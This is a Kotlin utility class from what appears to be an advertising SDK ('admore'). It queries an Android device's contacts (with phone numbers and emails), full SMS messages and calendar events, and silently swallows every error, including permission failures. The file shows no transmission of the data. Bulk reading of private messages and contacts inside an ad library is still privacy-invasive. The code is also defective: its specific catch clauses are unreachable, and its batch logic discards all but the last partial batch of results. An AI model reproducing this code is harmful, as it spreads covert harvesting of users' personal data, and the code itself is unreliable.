/**
 * Helper class to safely access content providers with cursor callbacks
 */
package com.seamlabs.admore.sdk.core.storage

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.ContactsContract
import android.provider.Telephony
import android.provider.CalendarContract
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext


/**
 * Utility class for safely handling ContentResolver operations
 */
class ContentResolverUtils(private val context: Context) {

    companion object {
        private const val BATCH_SIZE = 100 // Process data in batches to avoid memory issues
    }

    /**
     * Safely query content provider and process cursor data
     */
    suspend fun <T> safeQuery(
        uri: Uri,
        projection: Array<String>? = null,
        selection: String? = null,
        selectionArgs: Array<String>? = null,
        sortOrder: String? = null,
        processor: suspend (Cursor) -> T
    ): List<T> = withContext(Dispatchers.IO) {
        val results = mutableListOf<T>()
        var cursor: Cursor? = null
        
        try {
            cursor = context.contentResolver.query(
                uri,
                projection,
                selection,
                selectionArgs,
                sortOrder
            )

            cursor?.let {
                while (it.moveToNext()) {
                    try {
                        results.add(processor(it))
                    } catch (e: Exception) {
                        // Silently handle error
                    }
                }
            }
        } catch (e: Exception) {
            // Silently handle error
        } catch (e: OutOfMemoryError) {
            // Handle memory issues
            results.clear()
        } catch (e: SecurityException) {
            // Handle permission issues
        } catch (e: IllegalArgumentException) {
            // Handle invalid arguments
        } catch (e: Throwable) {
            // Handle any other unexpected errors
        } finally {
            try {
            cursor?.close()
            } catch (e: Exception) {
                // Silently handle cursor close error
            }
        }
        
        results
    }

    /**
     * Safely query contacts with batch processing
     */
    suspend fun safeQueryContacts(
        projection: Array<String>? = null,
        selection: String? = null,
        selectionArgs: Array<String>? = null,
        sortOrder: String? = null
    ): List<Map<String, Any>> = withContext(Dispatchers.IO) {
        val results = mutableListOf<Map<String, Any>>()
        var cursor: Cursor? = null
        
        try {
            cursor = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                sortOrder
            )
            
            cursor?.let {
                while (it.moveToNext()) {
                    try {
                        val contactId = it.getLong(it.getColumnIndex(ContactsContract.Contacts._ID))
                        val contactData = mutableMapOf<String, Any>()
                        
                        // Basic contact info
                        contactData["id"] = contactId
                        contactData["name"] = it.getString(
                            it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                        ) ?: "Unknown"
                        
                        // Get detailed info in batches
                        try {
                            contactData.putAll(getContactDetails(contactId))
                        } catch (e: Exception) {
                            // Silently handle contact details error
                        }
                        
                        results.add(contactData)
                        
                        // Process in batches to avoid memory issues
                        if (results.size >= BATCH_SIZE) {
                            // Process batch here if needed
                            results.clear()
                        }
                    } catch (e: Exception) {
                        // Silently handle error
                    }
                }
            }
        } catch (e: Exception) {
            // Silently handle error
        } catch (e: OutOfMemoryError) {
            // Handle memory issues
            results.clear()
        } catch (e: SecurityException) {
            // Handle permission issues
        } catch (e: IllegalArgumentException) {
            // Handle invalid arguments
        } catch (e: Throwable) {
            // Handle any other unexpected errors
        } finally {
            try {
                cursor?.close()
            } catch (e: Exception) {
                // Silently handle cursor close error
            }
        }
        
        results
    }

    /**
     * Safely query SMS messages with batch processing
     */
    suspend fun safeQuerySms(
        projection: Array<String>? = null,
        selection: String? = null,
        selectionArgs: Array<String>? = null,
        sortOrder: String? = null
    ): List<Map<String, Any>> = withContext(Dispatchers.IO) {
        val results = mutableListOf<Map<String, Any>>()
        var cursor: Cursor? = null
        
        try {
            cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                sortOrder
            )
            
            cursor?.let {
                while (it.moveToNext()) {
                    try {
                        val messageData = mutableMapOf<String, Any>()
                        
                        // Basic message info
                        messageData["id"] = it.getLong(it.getColumnIndex(Telephony.Sms._ID))
                        messageData["address"] = it.getString(
                            it.getColumnIndex(Telephony.Sms.ADDRESS)
                        ) ?: "Unknown"
                        messageData["body"] = it.getString(
                            it.getColumnIndex(Telephony.Sms.BODY)
                        ) ?: ""
                        messageData["date"] = it.getLong(it.getColumnIndex(Telephony.Sms.DATE))
                        
                        results.add(messageData)
                        
                        // Process in batches to avoid memory issues
                        if (results.size >= BATCH_SIZE) {
                            // Process batch here if needed
                            results.clear()
                        }
                    } catch (e: Exception) {
                        // Silently handle error
                    }
                }
            }
        } catch (e: Exception) {
            // Silently handle error
        } catch (e: OutOfMemoryError) {
            // Handle memory issues
            results.clear()
        } catch (e: SecurityException) {
            // Handle permission issues
        } catch (e: IllegalArgumentException) {
            // Handle invalid arguments
        } catch (e: Throwable) {
            // Handle any other unexpected errors
        } finally {
            try {
                cursor?.close()
            } catch (e: Exception) {
                // Silently handle cursor close error
        }
    }

        results
    }

    /**
     * Safely query calendar events with batch processing
     */
    suspend fun safeQueryCalendarEvents(
        projection: Array<String>? = null,
        selection: String? = null,
        selectionArgs: Array<String>? = null,
        sortOrder: String? = null
    ): List<Map<String, Any>> = withContext(Dispatchers.IO) {
        val results = mutableListOf<Map<String, Any>>()
        var cursor: Cursor? = null
        
        try {
            cursor = context.contentResolver.query(
                CalendarContract.Events.CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                sortOrder
            )
            
            cursor?.let {
                while (it.moveToNext()) {
                    try {
                        val eventData = mutableMapOf<String, Any>()
                        
                        // Basic event info
                        eventData["id"] = it.getLong(it.getColumnIndex(CalendarContract.Events._ID))
                        eventData["title"] = it.getString(
                            it.getColumnIndex(CalendarContract.Events.TITLE)
                        ) ?: "Untitled"
                        eventData["description"] = it.getString(
                            it.getColumnIndex(CalendarContract.Events.DESCRIPTION)
                        ) ?: ""
                        eventData["start_time"] = it.getLong(
                            it.getColumnIndex(CalendarContract.Events.DTSTART)
                        )
                        eventData["end_time"] = it.getLong(
                            it.getColumnIndex(CalendarContract.Events.DTEND)
                        )
                        
                        results.add(eventData)
                        
                        // Process in batches to avoid memory issues
                        if (results.size >= BATCH_SIZE) {
                            // Process batch here if needed
                            results.clear()
                        }
                    } catch (e: Exception) {
                        // Silently handle error
                    }
                }
            }
        } catch (e: Exception) {
            // Silently handle error
        } catch (e: OutOfMemoryError) {
            // Handle memory issues
            results.clear()
        } catch (e: SecurityException) {
            // Handle permission issues
        } catch (e: IllegalArgumentException) {
            // Handle invalid arguments
        } catch (e: Throwable) {
            // Handle any other unexpected errors
        } finally {
            try {
                cursor?.close()
            } catch (e: Exception) {
                // Silently handle cursor close error
            }
        }
        
        results
    }

    private suspend fun getContactDetails(contactId: Long): Map<String, Any> = withContext(Dispatchers.IO) {
        val details = mutableMapOf<String, Any>()
        var cursor: Cursor? = null
        
        try {
            // Get phone numbers
            cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                arrayOf(contactId.toString()),
                null
            )
            
            val phones = mutableListOf<String>()
            cursor?.let {
                while (it.moveToNext()) {
                    try {
                        phones.add(it.getString(
                            it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                        ) ?: "")
                    } catch (e: Exception) {
                        // Silently handle error
                    }
                }
            }
            details["phones"] = phones
            try {
                cursor?.close()
            } catch (e: Exception) {
                // Silently handle cursor close error
            }

            // Get email addresses
            cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                null,
                "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
                arrayOf(contactId.toString()),
                null
            )
            
            val emails = mutableListOf<String>()
            cursor?.let {
                while (it.moveToNext()) {
                    try {
                        emails.add(it.getString(
                            it.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)
                        ) ?: "")
                    } catch (e: Exception) {
                        // Silently handle error
                    }
                }
            }
            details["emails"] = emails
            try {
                cursor?.close()
            } catch (e: Exception) {
                // Silently handle cursor close error
            }

        } catch (e: Exception) {
            // Silently handle error
        } catch (e: OutOfMemoryError) {
            // Handle memory issues
            details.clear()
        } catch (e: SecurityException) {
            // Handle permission issues
        } catch (e: IllegalArgumentException) {
            // Handle invalid arguments
        } catch (e: Throwable) {
            // Handle any other unexpected errors
        } finally {
            try {
                cursor?.close()
            } catch (e: Exception) {
                // Silently handle cursor close error
            }
        }
        
        details
    }
}